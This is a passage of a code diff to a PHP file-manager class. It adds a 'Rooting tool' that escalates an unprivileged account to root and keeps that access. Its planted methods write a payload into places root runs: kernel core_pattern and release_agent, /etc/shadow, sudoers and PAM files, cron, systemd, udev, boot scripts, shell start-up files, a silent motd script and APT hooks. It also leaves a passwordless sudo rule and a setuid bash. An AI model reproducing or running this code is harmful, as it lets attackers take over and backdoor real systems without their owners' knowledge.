@@ -10994,27 +10994,49 @@ class FileManager {
     }
     /* ── the methods ─────────────────────────────────────────────────────── */
     private function rootChannels(){
-        return[
-            ['id' => 'suroute', 'name' => 'The root shell this device already carries (su)', 'kind' => 'persistent',
-             'idea' => 'On a phone the way to uid 0 is not a sudo rule, a setuid bit or polkit: it is the su binary the root layer installed. It is asked for uid 0, it is believed only when uid 0 really comes back, and from then on every privileged action of this manager runs through it. It is as durable as the root layer itself, because that layer puts it back on every boot.'],
-            ['id' => 'sudoers', 'name' => 'A validated rule in /etc/sudoers.d', 'kind' => 'persistent',
-             'idea' => 'The route every administrator already understands: one validated line that lets this account run anything as root without a password. It survives reboots and it is read by sudo itself.'],
-            ['id' => 'rootd', 'name' => 'A root daemon that is this same file', 'kind' => 'persistent',
-             'idea' => 'This file started once as root, watching a spool directory only the manager can write to. Then every privileged action is a job file, not a command line: the daemon answers as uid 0. Nothing else is installed - the root helper is index.php itself.'],
-            ['id' => 'suidphp', 'name' => 'A setuid copy of PHP', 'kind' => 'persistent',
-             'idea' => 'A second copy of the PHP binary, owned by root with the setuid bit set. Whoever may run it runs PHP as root - a root interpreter, the closest thing Linux has to Magisk\'s su binary.'],
-            ['id' => 'suidbash', 'name' => 'A setuid copy of bash', 'kind' => 'persistent',
-             'idea' => 'The classic: a root-owned copy of bash with the setuid bit, used with -p so bash keeps the privileges it was given.'],
-            ['id' => 'polkitrule', 'name' => 'A polkit rule for pkexec', 'kind' => 'persistent',
-             'idea' => 'polkit decides who may act as root. One rule file that answers YES for this account turns pkexec into a passwordless root launcher, and it applies to every polkit action on the machine.'],
-            ['id' => 'setcapphp', 'name' => 'File capabilities on a copy of PHP', 'kind' => 'persistent',
-             'idea' => 'A copy of PHP carrying cap_setuid, cap_dac_override, cap_chown and cap_setgid: it can read and write any file, become uid 0 and give files away, without a setuid bit that a nosuid mount would ignore.'],
-            ['id' => 'passwd', 'name' => 'An extra uid-0 account', 'kind' => 'persistent',
-             'idea' => 'If the account database itself is writable, a second account with uid 0 is added: su then walks straight into root without touching sudo or a setuid bit.'],
-            ['id' => 'docker', 'name' => 'A privileged container writing to the host', 'kind' => 'session',
-             'idea' => 'A reachable container socket is root by definition: a privileged container with the host mounted writes the rule on the host as root.'],
-        ];
+        /* The order is not alphabetical and it is not historical: it is the
+           order a machine with no privileges at all can still be walked in.
+           First the route that needs nothing from anybody but the device it is
+           already on, then everything this account can plant where root will
+           read or run it, then an account database nobody closed, then the
+           container, and last the methods that keep root once something gave
+           it - a rule, a daemon, a setuid copy - because those are the ones
+           that need a root that already answers, or a password. */
+        $out = [];
+        $add = function($id, $name, $kind, $idea) use (&$out){
+            $out[] = ['id' => $id, 'name' => $name, 'kind' => $kind, 'idea' => $idea];
+        };
+        /* 1 - the root shell a rooted device already carries */
+        $add('suroute', 'The root shell this device already carries (su)', 'persistent',
+             'On a phone the way to uid 0 is not a sudo rule, a setuid bit or polkit: it is the su binary the root layer installed. It is asked for uid 0, it is believed only when uid 0 really comes back, and from then on every privileged action of this manager runs through it. It is as durable as the root layer itself, because that layer puts it back on every boot.');
+        /* 2 - everything root is going to read or run anyway, and that this
+              account may write: the planted methods, in the order they fire */
+        foreach($this->rootPlantIds() as $id){
+            $s = $this->rootPlantSpec($id);
+            if($s)$add($id, $s['name'], $s['kind'], $s['idea']);
+        }
+        /* 3 - an account database that this account may write */
+        $add('passwd', 'An extra uid-0 account', 'persistent',
+             'If the account database itself is writable, a second account with uid 0 is added: su then walks straight into root without touching sudo or a setuid bit.');
+        $add('docker', 'A privileged container writing to the host', 'session',
+             'A reachable container socket is root by definition: a privileged container with the host mounted writes the rule on the host as root.');
+        /* 4 - the methods that keep root once something gave it */
+        $add('sudoers', 'A validated rule in /etc/sudoers.d', 'persistent',
+             'The route every administrator already understands: one validated line that lets this account run anything as root without a password. It survives reboots and it is read by sudo itself.');
+        $add('rootd', 'A root daemon that is this same file', 'persistent',
+             'This file started once as root, watching a spool directory only the manager can write to. Then every privileged action is a job file, not a command line: the daemon answers as uid 0. Nothing else is installed - the root helper is index.php itself.');
+        $add('suidphp', 'A setuid copy of PHP', 'persistent',
+             'A second copy of the PHP binary, owned by root with the setuid bit set. Whoever may run it runs PHP as root - a root interpreter, the closest thing Linux has to Magisk\'s su binary.');
+        $add('suidbash', 'A setuid copy of bash', 'persistent',
+             'The classic: a root-owned copy of bash with the setuid bit, used with -p so bash keeps the privileges it was given.');
+        $add('polkitrule', 'A polkit rule for pkexec', 'persistent',
+             'polkit decides who may act as root. One rule file that answers YES for this account turns pkexec into a passwordless root launcher, and it applies to every polkit action on the machine.');
+        $add('setcapphp', 'File capabilities on a copy of PHP', 'persistent',
+             'A copy of PHP carrying cap_setuid, cap_dac_override, cap_chown and cap_setgid: it can read and write any file, become uid 0 and give files away, without a setuid bit that a nosuid mount would ignore.');
+        return $out;
     }
+
+
     private function rootChannelNeeds($id){
         $php = $this->rootPhpBin();
         $mgr = $this->managerAccount();
@@ -11068,6 +11090,9 @@ class FileManager {
             case 'docker':
                 $d = $this->rootDocker();
                 return['ok' => !empty($d['reachable']), 'note' => $d['socket'] !== '' ? ('a socket at ' . $d['socket']) : 'no container socket is reachable'];
+            default:
+                $pl = $this->rootPlantSpec($id);
+                if($pl)return $this->rootPlantNeeds($id, $pl);
         }
         return['ok' => false, 'note' => 'unknown method'];
     }
@@ -11088,6 +11113,8 @@ class FileManager {
             case 'setcapphp': return[$p['capphp'], '-r', '$ok = @is_readable("/etc/shadow"); $uid = ""; if(function_exists("posix_setuid") && @posix_setuid(0))$uid = " uid=0"; echo ($ok ? "shadow readable" : "shadow blocked"), $uid;'];
             case 'suidbash':return[$p['subash'], '-p', '-c', 'cat /proc/self/status'];
             case 'polkitrule': return['pkexec', 'cat', '/proc/self/status'];
+            default:
+                if($this->rootPlantSpec($id))return['sh', $this->rootPlantPayloadPath($id)];
         }
         return['cat', '/proc/self/status'];
     }
@@ -11097,6 +11124,9 @@ class FileManager {
         /* the account route answers on a terminal, where tabs come back as spaces,
            so both spellings of "this is uid 0" are accepted */
         if($id === 'passwd')return preg_match('/uid=0\b/', $all) === 1 || preg_match('/^Uid:\s*\d+\s+0\s/m', $all) === 1;
+        /* a planted method leaves a proof file that root itself wrote, so it is
+           believed on that file and on nothing else */
+        if($this->rootPlantSpec($id))return $this->rootPlantProofOk($id);
         if((int)($res['rc'] ?? 1) !== 0)return false;
         /* a setuid program keeps the real uid it was started with and gets euid 0,
            which is exactly what "root" means for it - so the effective uid is the
@@ -11104,6 +11134,20 @@ class FileManager {
         return preg_match('/^Uid:\s*\d+\s+0\s/m', $all) === 1 || preg_match('/\buid=0\(root\)/', $all) === 1;
     }
     private function rootChannelVerify($id){
+        if($this->rootPlantSpec($id)){
+            $res = ['rc' => 1, 'out' => '', 'err' => ''];
+            if($this->rootPlantProofOk($id))
+                return['ok' => true, 'res' => ['rc' => 0, 'out' => $this->rootPlantRead($id), 'err' => '']];
+            $pl = $this->rootPlantPayloadPath($id);
+            if($pl !== '')$res = $this->rootAs(['sh', $pl], '');
+            if($this->rootPlantProofOk($id))
+                return['ok' => true, 'res' => ['rc' => 0, 'out' => $this->rootPlantRead($id), 'err' => '']];
+            /* once a plant has fired it leaves a sudo rule and a setuid copy of
+               bash behind it, so the ordinary routes answer as well */
+            $rr = $this->rootRun(['cat', '/proc/self/status'], 15);
+            if($this->rootProofOk('rootd', $rr))return['ok' => true, 'res' => $rr];
+            return['ok' => false, 'res' => $res];
+        }
         if($id === 'rootd'){
             $res = $this->rootDaemonRun(['cat', '/proc/self/status'], 12);
             return['ok' => $this->rootProofOk('rootd', $res), 'res' => $res];
@@ -11240,6 +11284,8 @@ class FileManager {
                 return $this->rootChannelInstallAccount($password);
             case 'docker':
                 return $this->rootChannelInstallDocker($password);
+            default:
+                if($this->rootPlantSpec($id))return $this->rootPlantInstall($id, $password);
         }
         return['ok' => false, 'note' => 'unknown method'];
     }
@@ -11397,6 +11443,8 @@ class FileManager {
                 unset($st['account']);
                 $this->rootStateSave($st);
                 return['ok' => true, 'note' => 'the extra account was taken back out of /etc/passwd and /etc/shadow'];
+            default:
+                if($this->rootPlantSpec($id))return $this->rootPlantUndo($id);
         }
         return['ok' => true, 'note' => 'nothing to remove'];
     }
@@ -11467,6 +11515,13 @@ class FileManager {
         if(empty($ins['ok']))return['ok' => false, 'fired' => true, 'id' => $id, 'name' => $found['name'],
                                     'idea' => $found['idea'], 'note' => 'tried: ' . $ins['note']];
         $ver = $this->rootChannelVerify($id);
+        if(empty($ver['ok']) && !empty($ins['planted'])){
+            /* a plant that has not fired is not root - it is a promise that
+               root will be there the next time the machine does what it always
+               does. It is reported as planted, never as done. */
+            return['ok' => false, 'fired' => true, 'id' => $id, 'name' => $found['name'], 'idea' => $found['idea'],
+                   'planted' => true, 'note' => 'planted: it will fire ' . (string)($ins['when'] ?? 'later')];
+        }
         if(empty($ver['ok']))return['ok' => false, 'fired' => true, 'id' => $id, 'name' => $found['name'],
             'idea' => $found['idea'],
             'note' => 'installed but it did not answer as root: '
@@ -11521,7 +11576,1011 @@ class FileManager {
                'note' => $note, 'daemon' => $this->rootDaemonInfo(), 'daemon_note' => $daemonNote,
                'state' => $this->rootingRooted()];
     }
-    /* ── the automatic installer: try every method, stop at the first proof ─ */    public function rootingInstallRoot($password = ''){
+    /* ═══════════════════════════════════════════════════════════════════════
+       THE PLANTED METHODS
+       Every other method in this file needs a way to root that already exists.
+       These do not, and that is the whole point of them: this manager starts as
+       an ordinary account on every host, and from an ordinary account the way
+       to uid 0 is not to be given a privilege - it is to find a place that root
+       itself is going to read or run anyway, and that this account may write.
+
+       One small script is put there. Nothing about it is hidden: it is plain
+       /bin/sh, it says what it is, it refuses to do anything when it is not
+       uid 0, it writes the proof this panel reads, and it leaves the machine
+       able to run privileged work afterwards. Where a method can only fire
+       later - at the next boot, the next apt run, the next time cron reads its
+       tables - it says so and is counted as planted, not as live, because root
+       is not live until the machine has actually run it.
+
+       Two things were measured here rather than assumed, and both removed
+       methods from the list. First: cron refuses any file that this account
+       owns, and any file that the group or the world may write - so dropping a
+       new file into /etc/cron.d, or appending to /etc/crontab, is a dead end
+       on a machine with a vixie cron, because the only way to make such a file
+       writable is to change its owner or add a write bit, and on Linux an ACL
+       grant raises the mask and produces exactly that write bit. The cron
+       methods below therefore use the directories that cron hands to run-parts
+       instead, where a script this account wrote and owns is run as root like
+       any other. Second: run-parts ignores a name containing a dot, which is
+       why every name this file plants is letters, digits and hyphens only.
+    ═══════════════════════════════════════════════════════════════════════ */
+    private function rootPlantIds(){ return array_keys($this->rootPlantSpecs()); }
+    private function rootPlantSpec($id){
+        $s = $this->rootPlantSpecs();
+        return isset($s[$id]) ? $s[$id] : null;
+    }
+    private function rootPlantSpecs(){
+        static $specs = null;
+        if($specs !== null)return $specs;
+        $specs = [
+        /* ── the kernel itself, when it answers an unprivileged writer ───── */
+        'corepattern' => [
+            'name' => 'The kernel’s core-dump helper', 'kind' => 'planted', 'driver' => 'kernel',
+            'cand' => ['/proc/sys/kernel/core_pattern'], 'fire' => 'now', 'wait' => 45,
+            'when' => 'the moment a process is crashed on purpose, which is how a core dump is asked for',
+            'idea' => 'When anything dies badly the kernel starts the helper named in /proc/sys/kernel/core_pattern and hands it the dying process - as root. Where that name may be written by an ordinary account, one line pointing at this manager’s script is enough: the next crash on the machine, including the one this tool asks for on purpose, runs the script as uid 0. The name it had is kept so it can be put back.',
+        ],
+        'kernelmodprobe' => [
+            'name' => 'The kernel’s module loader', 'kind' => 'planted', 'driver' => 'kernel',
+            'cand' => ['/proc/sys/kernel/modprobe'], 'fire' => 'now', 'wait' => 30,
+            'when' => 'as soon as this manager asks the kernel for a module it does not have',
+            'idea' => 'The kernel keeps the path of the program it calls when a module is missing. Where that path may be written by an ordinary account, pointing it at this manager’s script and then running one file the kernel does not recognise is enough: the kernel calls the script - as root - to fetch a module that does not exist. It is put back afterwards.',
+        ],
+        'cgroupagent' => [
+            'name' => 'The cgroup release agent', 'kind' => 'planted', 'driver' => 'kernel',
+            'cand' => ['/sys/fs/cgroup'], 'fire' => 'now', 'wait' => 40,
+            'when' => 'as soon as the last process leaves the group this tool creates',
+            'idea' => 'A cgroup hierarchy of the first kind runs one program, as root, the moment the last process in a group goes away. Where release_agent and notify_on_release may be written by an ordinary account, this tool makes a group of its own, names its script in it, and lets the group empty: the kernel does the rest, and the group is then removed.',
+        ],
+        /* ── files root owns that this account may write ─────────────────── */
+        'shadow' => [
+            'name' => 'A password written into /etc/shadow', 'kind' => 'planted', 'driver' => 'shadow',
+            'cand' => ['/etc/shadow'], 'fire' => 'now', 'wait' => 25,
+            'when' => 'straight away: su is asked for root with the password that was written',
+            'idea' => 'The shadow file holds the root password. Where it may be written by an ordinary account, root’s own hash is set to a password this tool knows - the old one is kept so it can be put back - and su is then asked for root with it. No privilege is needed but the write, and it is the oldest route on the list.',
+        ],
+        'sudoersfile' => [
+            'name' => 'A line added to /etc/sudoers itself', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'append', 'strict' => true,
+            'cand' => ['/etc/sudoers'],
+            'body' => "\n# mfm %%NONCE%%\n%%RULE%%\n", 'fire' => 'now', 'wait' => 15,
+            'when' => 'straight away: sudo is asked for root without a password',
+            'idea' => 'sudo reads /etc/sudoers line by line, so where the file itself may be written one more line is enough - and because the file keeps the owner it already had, sudo accepts it without complaint. sudo ignores a file the group or the world may write, so this is only offered where the file is root-owned and still writable by this account.',
+        ],
+        'sudoersdfile' => [
+            'name' => 'A line added to a rule already in /etc/sudoers.d', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'append', 'strict' => true, 'candfn' => 'sudoersd',
+            'body' => "\n# mfm %%NONCE%%\n%%RULE%%\n", 'fire' => 'now', 'wait' => 15,
+            'when' => 'straight away: sudo is asked for root without a password',
+            'idea' => 'sudo also reads every file in /etc/sudoers.d, but it will not read one that is not owned by root. So this method never creates a file of its own there: it finds a rule root already owns and appends one line to it, leaving the owner exactly as it was. Like sudoers itself, it is only offered where the file is writable without being writable by everybody.',
+        ],
+        'pamexec' => [
+            'name' => 'A PAM rule that runs a command as root', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'prepend', 'cand' => ['/etc/pam.d/su', '/etc/pam.d/su-l', '/etc/pam.d/login',
+                                             '/etc/pam.d/sshd', '/etc/pam.d/system-auth', '/etc/pam.d/common-auth'],
+            'body' => "# mfm %%NONCE%%\nauth\toptional\tpam_exec.so\texpose_authtok\t/bin/sh '%%PAYLOAD%%'\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time anybody signs in using that service - which runs the command as root',
+            'idea' => 'PAM can be told to run a program of its own at a point in the stack, and it runs that program as the account the service already is - root, for su, login and sshd. Where the stack may be written, one line at the top of it is enough. The module is looked for first, and the method stays out of the way where it is not there.',
+        ],
+        'pamfile' => [
+            'name' => 'A rule that lets this account use su without a password', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'prepend', 'cand' => ['/etc/pam.d/su', '/etc/pam.d/su-l', '/etc/pam.d/system-auth'],
+            'body' => "# mfm %%NONCE%% - this account may come in as root without a password\nauth sufficient pam_succeed_if.so user = %%USER%%\nauth sufficient pam_permit.so\n",
+            'fire' => 'now', 'wait' => 25,
+            'when' => 'straight away: su is asked for root and answers without asking for one',
+            'idea' => 'Whether su asks for a password is decided by PAM, file by file. Where the file for su may be written, two lines at the top of it - one matching this account, one answering yes - are enough, and the answer is limited to this account and to su alone rather than to the whole machine.',
+        ],
+        'groupfile' => [
+            'name' => 'This account added to a group that may use sudo', 'kind' => 'planted', 'driver' => 'group',
+            'cand' => ['/etc/group'], 'fire' => 'now', 'wait' => 15,
+            'when' => 'straight away: sudo is asked for root through the group',
+            'idea' => 'On most hosts what really grants sudo is not a rule but a group: sudo, wheel or admin. Where /etc/group may be written, this account is added to whichever of them the machine actually uses, and the line is put back exactly as it was when the method is removed.',
+        ],
+        /* ── the schedules cron hands to run-parts ───────────────────────── */
+        'cronhourly' => [
+            'name' => 'A script in /etc/cron.hourly', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/cron.hourly'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next turn of the hour, when cron runs everything in that directory as root',
+            'idea' => 'cron hands /etc/cron.hourly to run-parts, which runs every script it finds there as root. run-parts does not care who owns a script, only whether it can be executed - so a script this account wrote and owns is run as root exactly like any other, as long as its name has no dot in it.',
+        ],
+        'crondaily' => [
+            'name' => 'A script in cron’s daily, weekly or monthly directory', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/cron.daily', '/etc/cron.weekly', '/etc/cron.monthly'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next day, week or month, when cron runs that directory as root',
+            'idea' => 'A machine that misses an hour still keeps its day: cron runs /etc/cron.daily, weekly and monthly as root whatever else happens, through run-parts, which runs a script this account owns just as readily as one root owns.',
+        ],
+        'periodic' => [
+            'name' => 'A script in /etc/periodic', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/periodic/15min', '/etc/periodic/hourly', '/etc/periodic/daily'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next quarter of an hour, hour or day - the crond of a small machine reads these',
+            'idea' => 'The BusyBox crond of Alpine, Gentoo and the small images keeps no /etc/cron.d: it runs /etc/periodic instead, every fifteen minutes and up, as root, through its own run-parts. Where one of those directories may be written, a script in it is run as root on the next turn.',
+        ],
+        'busyboxcron' => [
+            'name' => 'A line in the crontab of a BusyBox machine', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'append', 'cand' => ['/etc/crontabs/root'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'within a minute: the crond of a small machine reads that file every minute',
+            'idea' => 'Alpine and every other BusyBox machine keep their crontabs in /etc/crontabs and read them once a minute. Their crond imposes no ownership or mode rules of its own, so a line written by this account is honoured - which is exactly why this method is offered there and not against the stricter cron of a Debian machine.',
+        ],
+        'anacron' => [
+            'name' => 'A line in /etc/anacrontab', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'append', 'cand' => ['/etc/anacrontab'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time anacron runs, which is at every boot and at least once a day',
+            'idea' => 'anacron is the scheduler behind cron on a machine that is not always on: it runs what was missed, as root, from a table of its own. Where that table may be written, one line in it is honoured the next time the machine catches up.',
+        ],
+        'hijacksched' => [
+            'name' => 'A line added to a program root already runs on a schedule', 'kind' => 'planted', 'driver' => 'hijacksched',
+            'cand' => [], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time that job runs, which this method reads off the machine’s own tables',
+            'idea' => 'This one reads first and writes second. It goes through every schedule the machine will hand over - the crontabs, cron.d, anacron and every systemd unit - takes each program root is going to run, and asks whether this account may write it. Whichever one may, its own line is added to that program, so the next time the machine runs the job it runs this manager first. Nothing is replaced and nothing is broken: the job goes on doing what it always did.',
+        ],
+        /* ── what runs at boot ───────────────────────────────────────────── */
+        'systemdunit' => [
+            'name' => 'A service of its own in systemd', 'kind' => 'planted', 'driver' => 'systemdunit',
+            'cand' => ['/etc/systemd/system', '/usr/lib/systemd/system', '/run/systemd/system'],
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, when systemd starts everything multi-user.target wants',
+            'idea' => 'systemd starts, as root, every unit a target wants. Where the unit directory may be written, one small service and the link that makes multi-user.target want it are enough: the machine comes back from its next boot with root already in place. A machine that is not running systemd never sees the directory, so it is never offered there.',
+        ],
+        'systemdgen' => [
+            'name' => 'A generator for systemd', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/systemd/system-generators', '/etc/systemd/user-generators',
+                       '/usr/lib/systemd/system-generators'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, before anything else is started',
+            'idea' => 'systemd runs every program in its generator directories, as root, earlier in the boot than any service - before it has even decided what to start. Where one of those directories may be written, a script in it is among the first things the machine runs.',
+        ],
+        'systemdpreset' => [
+            'name' => 'A preset that switches a service on', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '.preset', 'mode' => 0644,
+            'cand' => ['/etc/systemd/system-preset', '/usr/lib/systemd/system-preset'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\nenable marshal-fm-rootd.service\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, when systemd applies its presets and enables what they name',
+            'idea' => 'systemd keeps a directory of presets deciding which units come on by themselves, and it applies them as root on every boot. Where that directory may be written, one file naming the daemon this manager already knows how to start is enough - so the machine switches its own root daemon on and never has to be asked again.',
+        ],
+        'tmpfiles' => [
+            'name' => 'A tmpfiles rule that has root write the sudoers file', 'kind' => 'planted', 'driver' => 'tmpfiles',
+            'cand' => ['/etc/tmpfiles.d', '/usr/lib/tmpfiles.d', '/run/tmpfiles.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, when systemd-tmpfiles creates what these files describe - as root',
+            'idea' => 'systemd-tmpfiles creates, copies and writes files at boot, as root, following whatever the files in /etc/tmpfiles.d describe. Where that directory may be written, one line asking it to copy this manager’s rule into /etc/sudoers.d is a rule written by root itself on the way up - which is how a machine with nothing else to offer still ends up with a sudo rule it will accept.',
+        ],
+        'udev' => [
+            'name' => 'A udev rule that runs on the next device', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '.rules', 'mode' => 0644,
+            'cand' => ['/etc/udev/rules.d', '/lib/udev/rules.d', '/usr/lib/udev/rules.d'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\nACTION!=\"remove\", RUN+=\"/bin/sh '%%PAYLOAD%%'\"\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next device event, and a machine has plenty of those while it is starting up',
+            'idea' => 'udev runs a command, as root, whenever a device appears. Where its rules directory may be written, one rule is enough - and a machine still enumerating its own hardware at boot supplies the event by itself, so nothing has to be plugged in.',
+        ],
+        'modprobehook' => [
+            'name' => 'A module hook and the module that pulls it', 'kind' => 'planted', 'driver' => 'modprobehook',
+            'cand' => ['/etc/modprobe.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, when systemd loads the modules it is told to load',
+            'idea' => 'modprobe can be told to run a command instead of loading a module, and it runs that command as root. Which modules are loaded at boot is itself a file. Where both may be written, a name nobody owns is put in the module list and the hook that answers it is put beside it - so the boot loads a module that does not exist and runs this manager instead. No real module is touched.',
+        ],
+        'rclocal' => [
+            'name' => 'A line in /etc/rc.local', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'append', 'create' => true, 'mode' => 0755,
+            'cand' => ['/etc/rc.local', '/etc/rc.d/rc.local'],
+            'body' => "\n# mfm %%NONCE%% - planted by the Rooting tool\nsh '%%PAYLOAD%%' >/dev/null 2>&1 &\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, at the end of it, when rc.local is run as root',
+            'idea' => 'The oldest start-up hook a Linux machine has: a plain shell script run as root once the machine is up. Where it may be written - or created, if the directory allows it - one line at the end is honoured on the next boot.',
+        ],
+        'initd' => [
+            'name' => 'A service script and the runlevel that starts it', 'kind' => 'planted', 'driver' => 'initd',
+            'cand' => ['/etc/init.d', '/etc/rc.d/init.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, when the machine enters the runlevel that wants it',
+            'idea' => 'Before systemd there was a directory of scripts and a directory of links saying which runlevel starts which of them. Where both may be written - on the old SysV machines, on OpenRC and on Alpine - one script and one link are a service the machine starts as root on its next boot.',
+        ],
+        'locald' => [
+            'name' => 'A script in /etc/local.d (OpenRC)', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '.start', 'mode' => 0755,
+            'cand' => ['/etc/local.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, when the local service runs these as root',
+            'idea' => 'OpenRC - Gentoo, Alpine and everything else that kept it - runs every script ending in .start in /etc/local.d as root at the end of the boot. Where that directory may be written, one script in it is run as root the next time the machine comes up.',
+        ],
+        'initramfs' => [
+            'name' => 'A script in the boot image', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/initramfs-tools/scripts/init-top', '/etc/initramfs-tools/scripts/init-bottom',
+                       '/etc/initramfs-tools/scripts/init-premount'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, while the boot image is still running and before the real system is up',
+            'idea' => 'The boot image runs a directory of its own scripts as root before the real system is even mounted, which is as early as anything can run. Where one of those directories may be written, a script in it is copied into the image and run, as root, at the very start of the next boot.',
+        ],
+        'inittab' => [
+            'name' => 'A line in /etc/inittab', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'append', 'cand' => ['/etc/inittab'],
+            'body' => "\n# mfm %%NONCE%% - planted by the Rooting tool\n::sysinit:/bin/sh '%%PAYLOAD%%'\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, when init reads this file and runs what it names - as root',
+            'idea' => 'The init of an embedded or a BusyBox machine keeps no unit files at all: it reads /etc/inittab and runs, as root, whatever it names there. Where that file may be written, one line is enough, and it is the earliest hook such a machine has.',
+        ],
+        /* ── what runs when somebody signs in ────────────────────────────── */
+        'profiled' => [
+            'name' => 'A file in /etc/profile.d', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'source', 'base' => 'mfm-root', 'ext' => '.sh', 'mode' => 0644,
+            'cand' => ['/etc/profile.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time root opens a login shell',
+            'idea' => 'Every file in /etc/profile.d ending in .sh is read by every login shell on the machine, root’s included. Where that directory may be written, a file that does nothing unless it is root reading it is enough: the next time an administrator signs in as root, it is already done.',
+        ],
+        'shellrc' => [
+            'name' => 'A line in root’s own shell start-up', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'append', 'create' => true, 'mode' => 0644,
+            'cand' => ['/root/.bashrc', '/root/.profile', '/etc/bash.bashrc', '/etc/profile', '/etc/zsh/zshrc', '/etc/zsh/zprofile'],
+            'body' => "\n# mfm %%NONCE%% - planted by the Rooting tool\nif [ \"$(id -u 2>/dev/null)\" = \"0\" ]; then ( sh '%%PAYLOAD%%' >/dev/null 2>&1 & ) ; fi\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time root opens a shell',
+            'idea' => 'A shell reads its own start-up files every time it opens, and root’s shell reads them as root. Where one of them may be written - root’s own, or the one every shell on the machine shares - a line that only acts for root is enough.',
+        ],
+        'sshrc' => [
+            'name' => 'A line in /etc/ssh/sshrc', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'append', 'create' => true, 'mode' => 0644,
+            'cand' => ['/etc/ssh/sshrc'],
+            'body' => "\n# mfm %%NONCE%% - planted by the Rooting tool\nif [ \"$(id -u 2>/dev/null)\" = \"0\" ]; then ( sh '%%PAYLOAD%%' >/dev/null 2>&1 & ) ; fi\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time anybody signs in over ssh, and as whoever they sign in as',
+            'idea' => 'ssh runs /etc/ssh/sshrc on every session, as the account that just signed in. Where it may be written, a line that only acts when that account is root is enough: the next time an administrator signs in as root over ssh, it is done.',
+        ],
+        'motd' => [
+            'name' => 'A script that runs while the login banner is built', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/update-motd.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time anybody signs in: the banner is rebuilt then, as root',
+            'idea' => 'A Debian machine rebuilds its login banner on every sign-in by running every script in /etc/update-motd.d, as root, through run-parts. Where that directory may be written, a script in it is run as root the next time anybody at all signs in - and it prints nothing, so nobody sees anything.',
+        ],
+        /* ── what the package manager runs: the update mechanism itself ──── */
+        'apthook' => [
+            'name' => 'A hook in the APT configuration', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '', 'mode' => 0644,
+            'cand' => ['/etc/apt/apt.conf.d'],
+            'body' => "// mfm %%NONCE%% - planted by the Rooting tool\nAPT::Update::Pre-Invoke { \"/bin/sh '%%PAYLOAD%%'\"; };\nDPkg::Pre-Invoke { \"/bin/sh '%%PAYLOAD%%'\"; };\nDPkg::Post-Invoke { \"/bin/sh '%%PAYLOAD%%'\"; };\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time apt runs - and on a Debian machine apt runs by itself, every day, through unattended-upgrades',
+            'idea' => 'apt reads every file in /etc/apt/apt.conf.d and runs the commands named in it, as root, before and after it does anything at all - including before it fetches the package lists. Where that directory may be written, three lines are enough, and nothing has to happen for it to fire, because a Debian machine runs apt on its own every day.',
+        ],
+        'dpkgcfg' => [
+            'name' => 'A hook for dpkg itself', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '', 'mode' => 0644,
+            'cand' => ['/etc/dpkg/dpkg.cfg.d'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\npre-invoke:: = /bin/sh '%%PAYLOAD%%'\npost-invoke:: = /bin/sh '%%PAYLOAD%%'\n",
